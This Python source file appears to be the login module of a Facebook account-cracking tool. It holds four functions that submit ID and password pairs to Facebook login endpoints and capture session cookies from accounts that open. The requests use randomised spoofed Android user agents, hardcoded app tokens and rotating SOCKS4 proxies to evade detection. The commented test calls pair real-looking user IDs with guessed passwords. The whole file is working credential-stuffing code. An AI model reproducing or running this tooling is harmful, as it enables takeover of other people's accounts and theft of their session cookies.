#--> Author's Info
Author    = 'Dapunta Khurayra X'
Facebook  = 'Facebook.com/Dapunta.Khurayra.X'
Instagram = 'Instagram.com/Dapunta.Ratya'
Whatsapp  = '082245780524'
YouTube   = 'Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA'

#--> Import Module
import os, sys, bs4, base64, struct, datetime, binascii, requests, re, random, uuid
try: from crack import crack
except Exception as e: import crack
from datetime import datetime
from bs4 import BeautifulSoup as bs
from Cryptodome.Cipher import AES
from Cryptodome import Random as RDM
from nacl.public import PublicKey as PK
from nacl.public import SealedBox as SB

#--> Clear Terminal
def clear():
    if "linux" in sys.platform.lower():os.system('clear')
    elif "win" in sys.platform.lower():os.system('cls')

#--> Waktu
def waktu():
    _bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
    hari_ini = ("%s%s%s"%(datetime.now().day,_bulan_,datetime.now().year))
    return(str(hari_ini.lower()))

#--> Encrypt Facebook Password
def encpass(pw,wkt):
    sci = 'DapuntaLoveRanii'
    try:
        sem = open('login/publickey.json','r').read()
        if sem == 'Dapunta':
            return ('#PWD_BROWSER:%s:%s:%s'%(str(len(sci)-11),wkt,pw))
        else:
            return ('#PWD_BROWSER:%s:%s:%s'%(str(len(sci)-11),wkt,pw))
    except Exception as e:
        return ('#PWD_BROWSER:%s:%s:%s'%(str(len(sci)-11),wkt,pw))

#--> User Agent Samsung
def random_ua_samsung():
    os_ver = random.randrange(6,13)                                                                         #--> OS Version
    dv_typ = random.choice(['SM-X11O','SM-S367VL','SM-J610G','SM-G900P','SM-G988B','SM-G531H','SM-A405FN']) #--> Device Type
    bl_typ = random.choice(['PPR1','LRX21T','TP1A','RKQ1','SP1A','RP1A'])                                   #--> Build Type
    dv_ver = random.randrange(100000,250000)                                                                #--> Device Version
    sd_ver = random.randrange(1,10)                                                                         #--> Update Version
    ch_ver = random.choice(['112.0.5615.50','111.0.5563.116','111.0.5563.58','80.0.3987.162'])              #--> Chrome Version
    ua = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
    return(ua)

#--> User Agent Xiaomi
def random_ua_xiaomi():
    os_ver = random.randrange(6,13)                                                                               #--> OS Version
    dv_typ = random.choice(['22081212UG','M2102K1AC','M2101K6G','2210132C','M2007J3SG','21091116UI','M2004J19C']) #--> Device Type
    bl_typ = random.choice(['TKQ1','SKQ1','TP1A','RKQ1','SP1A','RP1A'])                                           #--> Build Type
    dv_ver = random.randrange(100000,250000)                                                                      #--> Device Version
    sd_ver = random.randrange(1,10)                                                                               #--> Update Version
    ch_ver = random.choice(['112.0.5615.50','111.0.5563.116','111.0.5563.58','80.0.3987.162'])                    #--> Chrome Version
    ua = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
    return(ua)

#--> User Agent Realme
def random_ua_realme():
    os_ver = random.randrange(6,13)                                                                 #--> OS Version
    dv_typ = random.choice(['RMX3663','RMX3392','RMX3081','RMX2170','RMX2061','RMX1971','RMX2020']) #--> Device Type
    bl_typ = random.choice(['QP1A','SKQ1','TP1A','RKQ1','SP1A','RP1A'])                             #--> Build Type
    dv_ver = random.randrange(100000,250000)                                                        #--> Device Version
    sd_ver = random.randrange(1,10)                                                                 #--> Update Version
    ch_ver = random.choice(['112.0.5615.50','111.0.5563.116','111.0.5563.58','80.0.3987.162'])      #--> Chrome Version
    ua = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
    return(ua)

#--> User Agent Nokia
def random_ua_nokia():
    os_ver = random.randrange(6,13)                                                                              #--> OS Version
    dv_typ = random.choice(['Nokia C1','Nokia C2','Nokia C3','Nokia XR20','Nokia X20','Nokia X30','Nokia X100']) #--> Device Type
    bl_typ = random.choice(['QP1A','PPR1','TP1A','RKQ1','SP1A','RP1A'])                                          #--> Build Type
    dv_ver = random.randrange(100000,250000)                                                                     #--> Device Version
    sd_ver = random.randrange(1,10)                                                                              #--> Update Version
    ch_ver = random.choice(['112.0.5615.50','111.0.5563.116','111.0.5563.58','80.0.3987.162'])                   #--> Chrome Version
    ua = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
    return(ua)

#--> User Agent Custom
def random_ua_custom():
    try:
        _file_ = open('login/custom_ua.json','r').read()
        if 'Android' in str(_file_):
            ad_ver = 'Android ' + str(re.search(r'Android\s+(\d+)', _file_).group(1))
            os_ver = 'Android ' + str(random.randrange(6,13))
            ua1 = _file_.replace(ad_ver,os_ver)
        else: ua1 = _file_
        if 'Build' in str(_file_):
            od_ver = 'Build/' + str(re.search(r'Build/([^;]+)', _file_).group(1))
            bl_typ = random.choice(['QP1A','PPR1','TP1A','RKQ1','SP1A','RP1A'])
            dv_ver = random.randrange(100000,250000)
            sd_ver = random.randrange(1,10)
            nw_str = 'Build/' + str('%s.%s.00%s'%(bl_typ,dv_ver,sd_ver))
            ua2 = ua1.replace(od_ver,nw_str)
        else: ua2 = ua1
        if 'Chrome' in str(_file_):
            ch_old = 'Chrome/' + str(re.search(r'Chrome/([^ ]+)', _file_).group(1))
            ch_ver = random.choice(['112.0.5615.50','111.0.5563.116','111.0.5563.58','80.0.3987.162'])
            ch_new = 'Chrome/' + str(ch_ver)
            ua3 = ua2.replace(ch_old,ch_new)
        else: ua3 = ua2
        return(ua3)
    except Exception as e:
        return('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]')

# fb_ver = random.choice(['350.0.0.4.116','408.1.0.36.103','262.0.0.34.117','216.0.0.38.104']) #--> Facebook App Version
# ua = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fb_ver};]'  

#--> Convert Cookies
def cvt(st,ran):
    try:
        if st == 'ok': cookie = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(ran['sb'],ran['datr'],ran['c_user'],ran['xs'],ran['fr']))
        elif st == 'cp': cookie = ('checkpoint=%s;datr=%s;fr=%s'%(ran['checkpoint'],ran['datr'],ran['fr']))
    except Exception as e : cookie = 'ranicantikbanget'
    return(str(cookie))

#--> Graph New
def graph_new(id,pw,host,us,pr):
    #host = ['https://api.facebook.com/restserver.php','https://b-api.facebook.com/method/auth.login?','https://graph.facebook.com/auth/login','https://b-graph.facebook.com/auth/login']
    if us   == 'Samsung' : ua = random_ua_samsung()
    elif us == 'Xiaomi'  : ua = random_ua_xiaomi()
    elif us == 'Realme'  : ua = random_ua_realme()
    elif us == 'Nokia'   : ua = random_ua_nokia()
    elif us == 'Custom'  : ua = random_ua_custom()
    else                 : ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
    r  = requests.Session()
    r.cookies.clear()
    apk = ['438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28', '350685531728|62f8ce9f74b12f84c123cc23437a4a32', '6628568379|c1e620fa708a1d5696fb991c1bde5662', '1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae', '1348564698517390|007c0a9101b9e1c8ffab727666805038']
    app = random.choice(apk)
    dat = {'adid':str(uuid.uuid4()), 'device_id':str(uuid.uuid4()), 'advertiser_id':str(uuid.uuid4()), 'family_device_id':str(uuid.uuid4()), 'cpl':'true', 'format':'json', 'email':id, 'password':pw, 'access_token':app, 'meta_inf_fbmeta':'', 'locale': 'id_ID', 'method':'auth.login', 'client_country_code':'ID', 'source':'device_based_login', 'generate_session_cookies':'1', 'currently_logged_in_userid':'0', 'error_detail_type':'button_with_disabled', 'fb_api_req_friendly_name': 'authenticate', 'credentials_type':'device_based_login_password', 'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler'}
    if 'graph' in host: dat.update({'api_key':'882a8490361da98702bf97a021ddc14d'})
    hed = {'x-fb-connection-bandwidth':str(random.randint(20000000.0, 30000000.0)), 'x-fb-net-hni':str(random.randint(20000, 40000)), 'x-fb-sim-hni':str(random.randint(20000, 40000)), 'x-fb-connection-quality':'EXCELLENT', 'x-fb-connection-type':'cell.CTRadioAccessTechnologyHSDPA', 'user-agent':ua, 'content-type':'application/x-www-form-urlencoded', 'x-fb-http-engine':'Liger'}
    if pr == True:
        try:
            pri = open('proxy/%s.json'%(waktu()),'r').read().splitlines()
            pro = random.choice(pri)
            prx = {'http':'socks4://%s'%(pro)}
        except Exception as e:
            prx = None
        pos = r.post(host, data=dat, headers=hed, allow_redirects=False, proxies=prx)
    else:
        pos = r.post(host, data=dat, headers=hed, allow_redirects=False)
    if 'session_key' in str(pos.json()):
        try:
            cok = {}
            for x in pos.json()['session_cookies']:
                cok.update({x['name']:x['value']})
        except Exception as e: cok = 'unknown'
        return {'stat':'ok', 'id':id, 'pw':pw, 'cookies':cvt('ok',cok), 'ua':ua}
    elif 'User must verify their account' in str(pos.json()): return {'stat':'cp', 'id':id, 'pw':pw, 'cookies':cvt('cp',r.cookies.get_dict()), 'ua':ua}
    else: return {'stat':'error', 'id':id, 'pw':pw}

#--> Regular New
def regular_new(id,pw,host,us,pr):
    if us   == 'Samsung' : ua = random_ua_samsung()
    elif us == 'Xiaomi'  : ua = random_ua_xiaomi()
    elif us == 'Realme'  : ua = random_ua_realme()
    elif us == 'Nokia'   : ua = random_ua_nokia()
    elif us == 'Custom'  : ua = random_ua_custom()
    else                 : ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
    cvs = re.search('Chrome/(\d+).', str(ua)).group(1)
    r   = requests.Session()
    r.cookies.clear()
    r.headers.update({'Host':host, 'Connection':'keep-alive', 'Keep-Alive':'timeout=5, max=1000', 'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-encoding':'gzip, deflate', 'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'cache-control':'max-age=0', 'x-requested-with':'XMLHttpRequest', 'sec-ch-ua':'"Not_A Brand";v="99", "Google Chrome";v="%s", "Chromium";v="%s"'%(cvs,cvs), 'sec-ch-ua-mobile':'?1', 'sec-ch-ua-platform':'"Android"', 'sec-fetch-dest':'empty', 'sec-fetch-mode':'cors', 'sec-fetch-site':'same-origin', 'sec-fetch-user':'?1', 'upgrade-insecure-requests':'1', 'user-agent':ua})
    apk = ['1109457329750736', '8777520805621155', '1322012231924815', '3391720001097849', '920308788960556', '1227057568249628']
    app = random.choice(apk)
    gth = 'https://github.com/Dapunta'
    url = f'https://{host}/login.php?email={id}&skip_api_login=1&app_id={app}&next=https://{host}/dialog/oauth?client_id={app}%26redirect_uri={gth}&locale=id_ID&refsrc=deprecated&shbl=0'
    req = bs(r.get(url).content,'html.parser')
    raq = req.find('form',{'method':'post'})
    dat = {
        'lsd'     : re.search('name="lsd" type="hidden" value="(.*?)"',     str(raq)).group(1),
        'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"', str(raq)).group(1),
        'm_ts'    : re.search('name="m_ts" type="hidden" value="(.*?)"',    str(raq)).group(1),
        'li'      : re.search('name="li" type="hidden" value="(.*?)"',      str(raq)).group(1),
        'bi_xrwh' : '0', 'try_number':'0', 'unrecognized_tries':'0',
        'email'   : id , 'pass':pw,
        'login'   : 'Masuk', '_fb_noscript':'true'}
    cok = '; '.join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])
    cok+= ' m_pixel_ratio=1.125; wd=1707x828'
    nek = f'https://{host}/login/device-based/regular/login/?email={id}&skip_api_login=1&app_id={app}&next=https://{host}/dialog/oauth?client_id={app}%26redirect_uri={gth}&locale2=id_ID&refsrc=deprecated&shbl=0'
    hed = {'Host':host, 'Connection':'keep-alive', 'Keep-Alive':'timeout=5, max=1000', 'accept-encoding':'gzip, deflate', 'cache-control':'max-age=0', 'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'content-length':str(len(("&").join(["%s=%s" % (x, y) for x, y in dat.items()]))), 'content-type':'application/x-www-form-urlencoded', 'cookie':cok, 'origin':host, 'referer':url, 'x-requested-with':'XMLHttpRequest', 'sec-ch-ua':'"Not_A Brand";v="99", "Google Chrome";v="%s", "Chromium";v="%s"'%(cvs,cvs), 'sec-ch-ua-mobile':'?1', 'sec-ch-ua-platform':'"Android"', 'sec-fetch-dest':'empty', 'sec-fetch-mode':'cors', 'upgrade-insecure-requests':'1', 'sec-fetch-site':'same-origin', 'sec-fetch-user':'?1', 'user-agent':ua}
    if pr == True:
        try:
            pri = open('proxy/%s.json'%(waktu()),'r').read().splitlines()
            pro = random.choice(pri)
            prx = {'http':'socks4://%s'%(pro)}
        except Exception as e:
            prx = None
        pos = r.post(nek, data=dat, cookies={'cookie':cok}, headers=hed, allow_redirects=False, proxies=prx)
    else:
        pos = r.post(nek, data=dat, cookies={'cookie':cok}, headers=hed, allow_redirects=False)
    if 'c_user' in r.cookies.get_dict(): return {'stat':'ok', 'id':id, 'pw':pw, 'cookies':cvt('ok',r.cookies.get_dict()), 'ua':ua}
    elif 'checkpoint' in r.cookies.get_dict(): return {'stat':'cp', 'id':id, 'pw':pw, 'cookies':cvt('cp',r.cookies.get_dict()), 'ua':ua}
    else: return {'stat':'error', 'id':id, 'pw':pw}

#--> Validate New
def validate_new(id,pw,host,us,pr):
    if us   == 'Samsung' : ua = random_ua_samsung()
    elif us == 'Xiaomi'  : ua = random_ua_xiaomi()
    elif us == 'Realme'  : ua = random_ua_realme()
    elif us == 'Nokia'   : ua = random_ua_nokia()
    elif us == 'Custom'  : ua = random_ua_custom()
    else                 : ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
    cvs = re.search('Chrome/(\d+).', str(ua)).group(1)
    r   = requests.Session()
    r.cookies.clear()
    r.headers.update({'Host':host, 'Connection':'keep-alive', 'Keep-Alive':'timeout=5, max=1000', 'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-encoding':'gzip, deflate', 'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'cache-control':'max-age=0', 'x-requested-with':'XMLHttpRequest', 'sec-ch-ua':'"Not_A Brand";v="99", "Google Chrome";v="%s", "Chromium";v="%s"'%(cvs,cvs), 'sec-ch-ua-mobile':'?1', 'sec-ch-ua-platform':'"Android"', 'sec-fetch-dest':'empty', 'sec-fetch-mode':'cors', 'sec-fetch-site':'same-origin', 'sec-fetch-user':'?1', 'upgrade-insecure-requests':'1', 'user-agent':ua})
    apk = ['1109457329750736', '8777520805621155', '1322012231924815', '3391720001097849', '920308788960556', '1227057568249628']
    app = random.choice(apk)
    gth = 'https://github.com/Dapunta'
    url = f'https://{host}/login/device-based/password/?uid={id}&flow=login_no_pin&skip_api_login=1&app_id={app}&next=https://{host}/dialog/oauth?client_id={app}%26redirect_uri={gth}&locale=id_ID&refsrc=deprecated&shbl=0'
    req = bs(r.get(url).content,'html.parser')
    raq = req.find('form',{'method':'post'})
    dat = {
        'lsd'     : re.search('name="lsd" type="hidden" value="(.*?)"',     str(raq)).group(1),
        'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"', str(raq)).group(1),
        'next'    : f'https://{host}/dialog/oauth?client_id={app}&redirect_uri={gth}',
        'flow'    : 'login_no_pin', 'uid':id, 'pass':pw, 'submit':'Masuk'}
    cok = '; '.join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])
    cok+= ' m_pixel_ratio=1.125; wd=1707x828'
    nek = f'https://{host}/login/device-based/validate-password/?shbl=0&locale2=id_ID'
    hed = {'Host':host, 'Connection':'keep-alive', 'Keep-Alive':'timeout=5, max=1000', 'accept-encoding':'gzip, deflate', 'cache-control':'max-age=0', 'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'content-length':str(len(("&").join(["%s=%s" % (x, y) for x, y in dat.items()]))), 'content-type':'application/x-www-form-urlencoded', 'cookie':cok, 'origin':host, 'referer':url, 'x-requested-with':'XMLHttpRequest', 'sec-ch-ua':'"Not_A Brand";v="99", "Google Chrome";v="%s", "Chromium";v="%s"'%(cvs,cvs), 'sec-ch-ua-mobile':'?1', 'sec-ch-ua-platform':'"Android"', 'sec-fetch-dest':'empty', 'sec-fetch-mode':'cors', 'upgrade-insecure-requests':'1', 'sec-fetch-site':'same-origin', 'sec-fetch-user':'?1', 'user-agent':ua}
    if pr == True:
        try:
            pri = open('proxy/%s.json'%(waktu()),'r').read().splitlines()
            pro = random.choice(pri)
            prx = {'http':'socks4://%s'%(pro)}
        except Exception as e:
            prx = None
        pos = r.post(nek, data=dat, cookies={'cookie':cok}, headers=hed, allow_redirects=False, proxies=prx)
    else:
        pos = r.post(nek, data=dat, cookies={'cookie':cok}, headers=hed, allow_redirects=False)
    if 'c_user' in r.cookies.get_dict(): return {'stat':'ok', 'id':id, 'pw':pw, 'cookies':cvt('ok',r.cookies.get_dict()), 'ua':ua}
    elif 'checkpoint' in r.cookies.get_dict(): return {'stat':'cp', 'id':id, 'pw':pw, 'cookies':cvt('cp',r.cookies.get_dict()), 'ua':ua}
    else: return {'stat':'error', 'id':id, 'pw':pw}

#--> Async New
def async_new(id,pw,host,us,pr):
    if us   == 'Samsung' : ua = random_ua_samsung()
    elif us == 'Xiaomi'  : ua = random_ua_xiaomi()
    elif us == 'Realme'  : ua = random_ua_realme()
    elif us == 'Nokia'   : ua = random_ua_nokia()
    elif us == 'Custom'  : ua = random_ua_custom()
    else                 : ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
    cvs = re.search('Chrome/(\d+).', str(ua)).group(1)
    r   = requests.Session()
    r.cookies.clear()
    r.headers.update({'Host':'m.facebook.com', 'Connection':'keep-alive', 'Keep-Alive':'timeout=5, max=1000', 'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-encoding':'gzip, deflate', 'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'cache-control':'max-age=0', 'x-requested-with':'XMLHttpRequest', 'sec-ch-ua':'"Not_A Brand";v="99", "Google Chrome";v="%s", "Chromium";v="%s"'%(cvs,cvs), 'sec-ch-ua-mobile':'?1', 'sec-ch-ua-platform':'"Android"', 'sec-fetch-dest':'empty', 'sec-fetch-mode':'cors', 'sec-fetch-site':'same-origin', 'sec-fetch-user':'?1', 'upgrade-insecure-requests':'1', 'user-agent':ua})
    apk = ['1109457329750736', '8777520805621155', '1322012231924815', '3391720001097849', '920308788960556', '1227057568249628']
    app = random.choice(apk)
    gth = 'https://github.com/Dapunta'
    url = f'https://{host}/login.php?email={id}&skip_api_login=1&app_id={app}&next=https://{host}/dialog/oauth?client_id={app}%26redirect_uri={gth}&locale=id_ID&refsrc=deprecated&shbl=0'
    req = bs(r.get(url).content,'html.parser')
    raq = req.find('form',{'method':'post'})
    wkt = re.search('"__spin_t":(.*?),', str(req)).group(1)
    dat = {
        'lsd'     : re.search('name="lsd" type="hidden" value="(.*?)"',     str(raq)).group(1),
        'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"', str(raq)).group(1),
        'm_ts'    : re.search('name="m_ts" type="hidden" value="(.*?)"',    str(raq)).group(1),
        'li'      : re.search('name="li" type="hidden" value="(.*?)"',      str(raq)).group(1),
        'fb_dtsg' : re.search('{"dtsg":{"token":"(.*?)",',                  str(req)).group(1),
        'bi_xrwh' : '0', 'try_number':'0', 'unrecognized_tries':'0', 'email':id , 'pass':pw, '_fb_noscript':'true',
        'prefill_contact_point':id, 'prefill_source':'provided_or_soft_matched', 'first_prefill_source':'provided_or_soft_matched',
        'first_prefill_type':'contact_point', 'prefill_type':'contact_point', 'had_cp_prefilled':'true', 'had_password_prefilled':'false', 'is_smart_lock':'false',
        'bi_wvdp' :str('{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}'),
        'encpass' : str(encpass(pw,wkt))}
    cok = '; '.join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])
    cok+= ' m_pixel_ratio=1.125; wd=1707x828'
    nek = f'https://{host}/login/device-based/login/async/?email={id}&skip_api_login=1&app_id={app}&next=https://{host}/dialog/oauth?client_id={app}%26redirect_uri={gth}&locale2=id_ID&refsrc=deprecated&shbl=0'
    hed = {'Host':host, 'Connection':'keep-alive', 'Keep-Alive':'timeout=5, max=1000', 'accept-encoding':'gzip, deflate', 'cache-control':'max-age=0', 'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'content-length':str(len(("&").join(["%s=%s" % (x, y) for x, y in dat.items()]))), 'content-type':'application/x-www-form-urlencoded', 'cookie':cok, 'origin':host, 'referer':url, 'x-requested-with':'XMLHttpRequest', 'sec-ch-ua':'"Not_A Brand";v="99", "Google Chrome";v="%s", "Chromium";v="%s"'%(cvs,cvs), 'sec-ch-ua-mobile':'?1', 'sec-ch-ua-platform':'"Android"', 'sec-fetch-dest':'empty', 'sec-fetch-mode':'cors', 'upgrade-insecure-requests':'1', 'sec-fetch-site':'same-origin', 'sec-fetch-user':'?1', 'user-agent':ua}
    if pr == True:
        try:
            pri = open('proxy/%s.json'%(waktu()),'r').read().splitlines()
            pro = random.choice(pri)
            prx = {'http':'socks4://%s'%(pro)}
        except Exception as e:
            prx = None
        pos = r.post(nek, data=dat, cookies={'cookie':cok}, headers=hed, allow_redirects=False, proxies=prx)
    else:
        pos = r.post(nek, data=dat, cookies={'cookie':cok}, headers=hed, allow_redirects=False)
    if 'c_user' in r.cookies.get_dict(): return {'stat':'ok', 'id':id, 'pw':pw, 'cookies':cvt('ok',r.cookies.get_dict()), 'ua':ua}
    elif 'checkpoint' in r.cookies.get_dict(): return {'stat':'cp', 'id':id, 'pw':pw, 'cookies':cvt('cp',r.cookies.get_dict()), 'ua':ua}
    else: return {'stat':'error', 'id':id, 'pw':pw}

if __name__ == '__main__':
    clear()
    # print(graph_new('100008395171248','rahayu123','https://graph.facebook.com/auth/login'))
    # print(regular_new('100008395171248','rahayu123','m.facebook.com'))
    # print(validate_new('100039348633915','yani endar','m.facebook.com'))
    # print(validate_new('100087558643895','omi om','m.facebook.com','Custom'))
    # print(async_new('100008395171248','rahayu123','m.facebook.com'))
    pass

# host url fb = ['mbasic.facebook.com','m.facebook.com','touch.facebook.com','free.facebook.com']
# host api fb = ['https://api.facebook.com/restserver.php','https://b-api.facebook.com/method/auth.login?','https://graph.facebook.com/auth/login','https://b-graph.facebook.com/auth/login']
